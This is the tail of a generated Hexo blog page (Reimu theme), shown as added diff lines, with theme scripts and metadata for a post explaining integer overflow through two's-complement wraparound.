+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "特殊的栈溢出-整数溢出",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/",
+          excerpt: "",
+          description: "",
+          stripContent: "特殊的栈溢出-整数溢出整数溢出介绍  上界溢出（加法溢出add）有符号上界溢出  有符号整数的补码存储规则32767+1&amp;#x3D;-32768—— 计算机中所有有符号整数都用 “补码” 表示，这是溢出后数值回绕的根本原因。 123456789101112131415161718192021222324252627282930313233343536373839404142434445461）先明确 short int 的基础属性存储长度：2 字节 = 16 位二进制（bit），只能存储 16 ",
+          date: "Tue Apr 28 2026 19:14:15 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
